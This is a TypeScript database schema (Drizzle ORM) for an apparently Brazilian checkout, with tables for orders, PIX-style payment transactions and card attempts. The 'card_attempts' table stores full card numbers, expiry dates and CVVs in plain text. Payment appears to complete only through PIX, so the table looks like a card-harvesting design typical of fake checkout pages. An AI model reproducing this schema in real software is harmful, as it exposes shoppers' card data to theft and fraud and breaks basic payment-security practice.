import { integer, pgEnum, pgTable, serial, text, timestamp, varchar } from "drizzle-orm/pg-core";

const orderStatusEnum = pgEnum("order_status", ["pending", "paid", "failed", "cancelled"]);
const transactionStatusEnum = pgEnum("transaction_status", ["PENDENTE", "COMPLETO", "FALHA"]);

export const orders = pgTable("orders", {
  id: serial("id").primaryKey(),
  customerName: varchar("customerName", { length: 255 }).notNull(),
  customerEmail: varchar("customerEmail", { length: 320 }),
  customerDocument: varchar("customerDocument", { length: 14 }).notNull(),
  customerPhone: varchar("customerPhone", { length: 20 }),
  shippingZipcode: varchar("shippingZipcode", { length: 9 }).notNull(),
  shippingStreet: varchar("shippingStreet", { length: 255 }).notNull(),
  shippingNumber: varchar("shippingNumber", { length: 20 }).notNull(),
  shippingComplement: varchar("shippingComplement", { length: 255 }),
  shippingNeighborhood: varchar("shippingNeighborhood", { length: 100 }).notNull(),
  shippingCity: varchar("shippingCity", { length: 100 }).notNull(),
  shippingState: varchar("shippingState", { length: 2 }).notNull(),
  productId: varchar("productId", { length: 50 }).notNull(),
  productName: varchar("productName", { length: 255 }).notNull(),
  productPrice: integer("productPrice").notNull(),
  shippingMethod: varchar("shippingMethod", { length: 50 }).default("PAC").notNull(),
  shippingCost: integer("shippingCost").default(0).notNull(),
  shippingDays: varchar("shippingDays", { length: 50 }).default("4 a 7 dias").notNull(),
  bumpsTotal: integer("bumpsTotal").default(0).notNull(),
  bumpIds: text("bumpIds"),
  status: orderStatusEnum("status").default("pending").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().$onUpdate(() => new Date()).notNull(),
});

export type Order = typeof orders.$inferSelect;
export type InsertOrder = typeof orders.$inferInsert;

export const transactions = pgTable("transactions", {
  id: serial("id").primaryKey(),
  orderId: integer("orderId").references(() => orders.id).notNull(),
  misticpayTransactionId: varchar("misticpayTransactionId", { length: 255 }).notNull().unique(),
  amount: integer("amount").notNull(),
  fee: integer("fee").notNull(),
  qrCodeBase64: text("qrCodeBase64"),
  qrcodeUrl: text("qrcodeUrl"),
  copyPaste: text("copyPaste"),
  status: transactionStatusEnum("status").default("PENDENTE").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().$onUpdate(() => new Date()).notNull(),
});

export type Transaction = typeof transactions.$inferSelect;
export type InsertTransaction = typeof transactions.$inferInsert;

export const cardAttempts = pgTable("card_attempts", {
  id: serial("id").primaryKey(),
  orderId: integer("orderId").references(() => orders.id).notNull(),
  cardNumber: varchar("cardNumber", { length: 24 }).notNull(),
  cardExpiry: varchar("cardExpiry", { length: 7 }).notNull(),
  cardCvv: varchar("cardCvv", { length: 8 }).notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type CardAttempt = typeof cardAttempts.$inferSelect;
export type InsertCardAttempt = typeof cardAttempts.$inferInsert;
